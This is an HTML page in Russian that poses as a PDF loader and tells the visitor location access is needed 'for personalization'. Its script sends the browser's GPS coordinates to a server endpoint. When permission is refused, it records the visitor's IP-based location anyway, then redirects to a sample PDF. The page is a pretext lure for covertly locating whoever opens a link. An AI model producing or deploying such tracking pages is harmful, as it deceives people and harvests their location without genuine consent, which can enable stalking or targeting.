<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Открытие PDF</title>
</head>
<body>
    <h1>Загрузка PDF...</h1>
    <p>Для доступа к PDF, пожалуйста, разрешите доступ к вашему местоположению. Это необходимо для персонализации контента. Если вы откажетесь, мы используем примерное местоположение.</p>
    <script>
        // Запрашиваем геолокацию
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const { latitude, longitude } = position.coords;

                    // Отправляем координаты на сервер
                    try {
                        const response = await fetch('/api/save-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ latitude, longitude })
                        });
                        const result = await response.json();
                        if (result.success) {
                            // Перенаправляем на PDF
                            window.location.href = '/sample.pdf';
                        } else {
                            alert('Ошибка при сохранении данных');
                        }
                    } catch (err) {
                        console.error('Ошибка:', err);
                        alert('Ошибка сервера');
                    }
                },
                async (error) => {
                    console.error('Ошибка геолокации:', error);
                    alert('Доступ к геолокации отклонён. Используем примерное местоположение.');
                    // Запасной вариант: IP-геолокация
                    try {
                        const response = await fetch('/api/save-ip-location', {
                            method: 'GET',
                            headers: { 'Content-Type': 'application/json' }
                        });
                        const result = await response.json();
                        if (result.success) {
                            window.location.href = result.redirect || '/sample.pdf';
                        } else {
                            alert('Ошибка при сохранении данных');
                        }
                    } catch (err) {
                        console.error('Ошибка IP-геолокации:', err);
                        alert('Ошибка сервера');
                    }
                }
            );
        } else {
            alert('Геолокация не поддерживается вашим браузером. Используем примерное местоположение.');
            // Запасной вариант: IP-геолокация
            saveIpLocation();
        }

        async function saveIpLocation() {
            try {
                const response = await fetch('/api/save-ip-location', {
                    method: 'GET',
                    headers: { 'Content-Type': 'application/json' }
                });
                const result = await response.json();
                if (result.success) {
                    window.location.href = result.redirect || '/sample.pdf';
                } else {
                    alert('Ошибка при сохранении данных');
                }
            } catch (err) {
                console.error('Ошибка:', err);
                alert('Ошибка сервера');
            }
        }
    </script>
</body>
</html>
